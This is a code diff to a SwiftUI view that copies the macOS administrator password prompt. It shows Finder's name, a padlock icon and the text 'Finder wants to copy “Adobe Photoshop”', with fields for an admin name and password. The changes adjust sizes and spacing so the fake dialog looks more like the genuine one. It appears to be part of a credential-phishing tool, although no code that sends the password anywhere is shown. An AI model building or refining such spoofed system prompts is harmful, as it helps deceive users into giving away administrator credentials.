@@ -103,9 +103,9 @@ struct FinderPadlockIcon: View {
                 Image(nsImage: img)
                     .resizable()
                     .interpolation(.high)
-                    .frame(width: 56, height: 56)
+                    .frame(width: 62, height: 62)
             } else {
-                Color.clear.frame(width: 56, height: 56)
+                Color.clear.frame(width: 62, height: 62)
             }
         }
         .onAppear {
@@ -117,7 +117,7 @@ struct FinderPadlockIcon: View {
     }
 }
 
-private let fieldButtonFill = Color.black.opacity(0.10)
+private let fieldButtonFill = Color.black.opacity(0.13)
 private let appleSystemBlue = Color(red: 0.0, green: 0.478, blue: 1.0)
 
 struct SecondaryButtonStyle: ButtonStyle {
@@ -126,7 +126,7 @@ struct SecondaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(.primary)
             .frame(maxWidth: .infinity)
-            .frame(height: 26)
+            .frame(height: 24)
             .background(Capsule(style: .continuous).fill(fieldButtonFill))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.70 : 1.0)
@@ -139,7 +139,7 @@ struct PrimaryButtonStyle: ButtonStyle {
             .font(.system(size: 13))
             .foregroundColor(.white)
             .frame(maxWidth: .infinity)
-            .frame(height: 26)
+            .frame(height: 24)
             .background(Capsule(style: .continuous).fill(appleSystemBlue))
             .contentShape(Capsule(style: .continuous))
             .opacity(configuration.isPressed ? 0.80 : 1.0)
@@ -156,21 +156,22 @@ struct ContentView: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 10)
+                .padding(.bottom, 18)
 
             Text("Finder")
                 .font(.system(size: 15, weight: .bold))
                 .foregroundColor(.primary)
-                .padding(.bottom, 8)
+                .padding(.bottom, 16)
 
             Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
-                .padding(.bottom, 7)
+                .padding(.bottom, 6)
 
             Text("Enter an administrator\u{2019}s name and password to allow this.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
+                .lineSpacing(2)
                 .fixedSize(horizontal: false, vertical: true)
                 .padding(.bottom, 14)
 
@@ -192,7 +193,7 @@ struct ContentView: View {
                     .onSubmit { focusedField = .password }
             }
             .background(fieldBg)
-            .padding(.bottom, 6)
+            .padding(.bottom, 8)
 
             ZStack(alignment: .leading) {
                 if password.isEmpty {
@@ -233,11 +234,10 @@ struct ContentView: View {
                 }
             }
         }
-        .padding(18)
-        .frame(width: 320)
+        .padding(14)
+        .frame(width: 264)
         .background(
             VisualEffectView(material: .popover)
-                .ignoresSafeArea()
         )
         .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
         .overlay(
@@ -245,9 +245,9 @@ struct ContentView: View {
                 .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
         )
         .shadow(color: .black.opacity(0.22), radius: 22, x: 0, y: 8)
-        .padding(.top, 18)
-        .padding(.horizontal, 24)
-        .padding(.bottom, 32)
+        .padding(.top, 12)
+        .padding(.horizontal, 16)
+        .padding(.bottom, 22)
         .onAppear {
             DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
                 focusedField = .username
